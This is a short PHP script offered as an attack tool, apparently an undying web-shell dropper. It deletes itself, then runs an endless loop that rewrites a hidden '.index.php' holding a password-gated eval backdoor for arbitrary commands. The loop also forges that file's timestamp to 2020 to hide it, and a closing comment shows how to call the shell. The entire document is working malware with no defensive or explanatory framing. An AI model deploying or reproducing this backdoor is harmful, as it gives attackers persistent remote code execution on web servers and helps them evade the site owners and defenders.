<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.index.php';
$code = '<?php
if(md5($_POST["pass"])=="1bc29b36f623ba82aaf6724fd3b16718") {
@eval($_POST[a]);} ?>';
while(1) {
    file_put_contents($file,$code);
    usleep(3000);
    touch('.index.php', mktime(19, 30, 11, 5, 17, 2020));
}
?>

# ?pass=md5&a=command
